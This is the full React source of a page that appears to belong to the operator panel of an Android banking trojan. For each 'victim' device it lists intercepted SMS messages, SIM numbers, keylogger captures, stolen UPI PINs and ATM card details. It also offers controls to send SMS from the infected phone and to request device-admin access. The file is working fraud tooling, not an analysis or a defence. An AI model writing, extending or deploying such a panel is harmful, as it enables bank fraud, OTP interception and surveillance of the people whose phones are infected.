import { useParams, useNavigate } from 'react-router-dom';
import { useState } from 'react';
import { ArrowLeft, Smartphone, MessageSquare, Phone, Keyboard, CreditCard, Building, Shield, RefreshCw, Send } from 'lucide-react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Button } from '@/components/ui/button';
import { useDB } from '@/hooks/useDB';
import { getRelativeTime } from '@/utils/time';
import { SendSMSDialog } from '@/components/SendSMSDialog';

export function DeviceDetailPage() {
  const { victimId } = useParams<{ victimId: string }>();
  const navigate = useNavigate();
  const { db, getVictimMessages, getSims, getKeyLogs, getUPIs, getATMCards } = useDB();
  
  // State for Send SMS dialog
  const [smsDialogOpen, setSmsDialogOpen] = useState(false);

  if (!victimId) {
    navigate('/devices');
    return null;
  }

  const device = db.DeviceInfo[victimId];
  const messages = getVictimMessages(victimId);
  const sims = getSims(victimId);
  const keyLogs = getKeyLogs(victimId);
  const upiPins = getUPIs(victimId);
  const atmCards = getATMCards(victimId);

  if (!device) {
    return (
      <div className="text-center py-12">
        <h2 className="text-2xl font-bold mb-4">Device Not Found</h2>
        <Button onClick={() => navigate('/devices')}>
          <ArrowLeft className="w-4 h-4 mr-2" />
          Back to Devices
        </Button>
      </div>
    );
  }

  const handleSendSMS = () => {
    setSmsDialogOpen(true);
  };

  const closeSMSDialog = () => {
    setSmsDialogOpen(false);
  };

  return (
    <>
      <div className="flex min-h-screen bg-background">
        {/* Device Details */}
        <div className="flex-1 p-6 overflow-y-auto">
          {/* Header */}
          <div className="mb-6">
            <div className="flex items-center gap-3 mb-2">
              <Button
                variant="ghost"
                size="icon"
                onClick={() => navigate('/devices')}
                className="hover:bg-muted"
              >
                <ArrowLeft className="w-4 h-4" />
              </Button>
              <div className="w-12 h-12 rounded-lg bg-gradient-to-br from-primary to-accent flex items-center justify-center">
                <Smartphone className="w-6 h-6 text-white" />
              </div>
              <div>
                <h1 className="text-2xl font-bold">{victimId}</h1>
                <p className="text-muted-foreground">{device.Model}</p>
              </div>
            </div>
          </div>

          {/* Tabs */}
          <Tabs defaultValue="overview" className="w-full">
            <TabsList className="grid w-full grid-cols-6 bg-muted/50 mb-6">
              <TabsTrigger value="overview" className="flex items-center gap-2">
                <Smartphone className="w-4 h-4" />
                Overview
              </TabsTrigger>
              <TabsTrigger value="messages" className="flex items-center gap-2">
                <MessageSquare className="w-4 h-4" />
                Messages
              </TabsTrigger>
              <TabsTrigger value="sims" className="flex items-center gap-2">
                <Phone className="w-4 h-4" />
                Sims
              </TabsTrigger>
              <TabsTrigger value="keylogs" className="flex items-center gap-2">
                <Keyboard className="w-4 h-4" />
                Key logs
              </TabsTrigger>
              <TabsTrigger value="upipins" className="flex items-center gap-2">
                <CreditCard className="w-4 h-4" />
                UPI pins
              </TabsTrigger>
              <TabsTrigger value="atmcards" className="flex items-center gap-2">
                <Building className="w-4 h-4" />
                ATM cards
              </TabsTrigger>
            </TabsList>

            {/* Action Buttons */}
            <div className="flex justify-end gap-3 mb-6">
              <Button
                variant="outline"
                className="flex items-center gap-2 bg-blue-50 hover:bg-blue-100 border-blue-200 text-blue-700"
              >
                <Shield className="w-4 h-4" />
                Device Admin Access
              </Button>
              <Button
                variant="outline"
                className="flex items-center gap-2 bg-blue-50 hover:bg-blue-100 border-blue-200 text-blue-700"
              >
                <RefreshCw className="w-4 h-4" />
                Re Sync Device
              </Button>
              <Button
                onClick={handleSendSMS}
                disabled={device.Status !== 'Online'}
                className="flex items-center gap-2 bg-blue-600 hover:bg-blue-700 text-white"
              >
                <Send className="w-4 h-4" />
                Send SMS
              </Button>
            </div>

            <TabsContent value="overview">
              <Card className="card-glass border-0">
                <CardContent className="p-8">
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div className="space-y-4">
                      <div className="flex justify-between items-center">
                        <span className="text-muted-foreground font-medium">Device:</span>
                        <span className="font-mono">{victimId}</span>
                      </div>
                      <div className="flex justify-between items-center">
                        <span className="text-muted-foreground font-medium">Status:</span>
                        <Badge className={device.Status === 'Online' ? 'badge-online' : 'badge-offline'}>
                          {device.Status}
                        </Badge>
                      </div>
                      <div className="flex justify-between items-center">
                        <span className="text-muted-foreground font-medium">Android:</span>
                        <span>{device.AndroidVersion}</span>
                      </div>
                      <div className="flex justify-between items-center">
                        <span className="text-muted-foreground font-medium">IP Address:</span>
                        <span className="font-mono">{device.IPAddress}</span>
                      </div>
                      <div className="flex justify-between items-center">
                        <span className="text-muted-foreground font-medium">UPI Pin:</span>
                        <code className="bg-muted px-2 py-1 rounded text-sm">{device.UPIPin}</code>
                      </div>
                    </div>
                    <div className="space-y-4">
                      <div className="flex justify-between items-center">
                        <span className="text-muted-foreground font-medium">Note:</span>
                        <span>{device.Note}</span>
                      </div>
                      <div className="flex justify-between items-center">
                        <span className="text-muted-foreground font-medium">Added:</span>
                        <span>{device.Added}</span>
                      </div>
                      <div className="flex justify-between items-center">
                        <span className="text-muted-foreground font-medium">Apps Installed:</span>
                        <Badge variant="outline">{device.AppsInstalled}</Badge>
                      </div>
                      <div className="flex justify-between items-center">
                        <span className="text-muted-foreground font-medium">Battery:</span>
                        <Badge variant={parseInt(device.Battery?.replace('%', '') || '0') < 20 ? 'destructive' : 'default'}>
                          {device.Battery}
                        </Badge>
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </TabsContent>

            <TabsContent value="messages">
              <Card className="card-glass border-0">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <MessageSquare className="w-5 h-5" />
                    Messages ({messages.length})
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  {messages.length === 0 ? (
                    <p className="text-muted-foreground text-center py-12">No messages found</p>
                  ) : (
                    <div className="space-y-4 max-h-96 overflow-y-auto">
                      {messages.map((msg, idx) => (
                        <div key={idx} className="p-4 bg-muted/30 rounded-lg border">
                          <div className="flex items-start justify-between gap-3 mb-2">
                            <span className="font-medium text-sm">{msg.Sender}</span>
                            <div className="flex items-center gap-2">
                              <Badge variant="outline" className="text-xs">{msg.SmsType}</Badge>
                              <span className="text-xs text-muted-foreground">{getRelativeTime(msg.Time)}</span>
                            </div>
                          </div>
                          <p className="text-sm text-muted-foreground">{msg.Body}</p>
                        </div>
                      ))}
                    </div>
                  )}
                </CardContent>
              </Card>
            </TabsContent>

            <TabsContent value="sims">
              <Card className="card-glass border-0">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Phone className="w-5 h-5" />
                    SIM Cards ({sims.length})
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  {sims.length === 0 ? (
                    <p className="text-muted-foreground text-center py-12">No SIM cards found</p>
                  ) : (
                    <div className="space-y-3">
                      {sims.map((sim, idx) => (
                        <div key={idx} className="flex items-center justify-between p-4 bg-muted/30 rounded-lg">
                          <div>
                            <span className="font-medium">Slot {sim.slot}</span>
                            <p className="text-sm text-muted-foreground">{sim.carrier || 'No carrier'}</p>
                          </div>
                          <code className="text-sm font-mono">{sim.number || 'No number'}</code>
                        </div>
                      ))}
                    </div>
                  )}
                </CardContent>
              </Card>
            </TabsContent>

            <TabsContent value="keylogs">
              <Card className="card-glass border-0">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Keyboard className="w-5 h-5" />
                    Key Logs ({keyLogs.length})
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  {keyLogs.length === 0 ? (
                    <p className="text-muted-foreground text-center py-12">No key logs found</p>
                  ) : (
                    <div className="space-y-3 max-h-96 overflow-y-auto">
                      {keyLogs.map((log, idx) => (
                        <div key={idx} className="p-4 bg-muted/30 rounded-lg border font-mono">
                          <div className="flex items-center justify-between mb-2">
                            <span className="text-xs text-muted-foreground">{getRelativeTime(log.time)}</span>
                          </div>
                          <code className="text-sm">{log.text}</code>
                        </div>
                      ))}
                    </div>
                  )}
                </CardContent>
              </Card>
            </TabsContent>

            <TabsContent value="upipins">
              <Card className="card-glass border-0">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <CreditCard className="w-5 h-5" />
                    UPI Pins ({upiPins.length})
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  {upiPins.length === 0 ? (
                    <p className="text-muted-foreground text-center py-12">No UPI pins found</p>
                  ) : (
                    <div className="space-y-2">
                      {upiPins.map((pin, idx) => (
                        <div key={idx} className="p-4 bg-muted/30 rounded-lg">
                          <code className="text-sm font-mono">{pin}</code>
                        </div>
                      ))}
                    </div>
                  )}
                </CardContent>
              </Card>
            </TabsContent>

            <TabsContent value="atmcards">
              <Card className="card-glass border-0">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Building className="w-5 h-5" />
                    ATM Cards ({atmCards.length})
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  {atmCards.length === 0 ? (
                    <p className="text-muted-foreground text-center py-12">No ATM cards found</p>
                  ) : (
                    <div className="space-y-3">
                      {atmCards.map((card, idx) => (
                        <div key={idx} className="p-4 bg-muted/30 rounded-lg border">
                          <div className="flex items-center justify-between">
                            <div>
                              <p className="font-medium">{card.bank} Bank</p>
                              <p className="text-sm text-muted-foreground">{card.name}</p>
                            </div>
                            <code className="text-sm font-mono">****{card.last4}</code>
                          </div>
                        </div>
                      ))}
                    </div>
                  )}
                </CardContent>
              </Card>
            </TabsContent>
          </Tabs>
        </div>
      </div>
      <SendSMSDialog 
         isOpen={smsDialogOpen} 
         onClose={closeSMSDialog} 
         device={device}
         deviceId={victimId} 
       />
    </>
  );
}

export default DeviceDetailPage;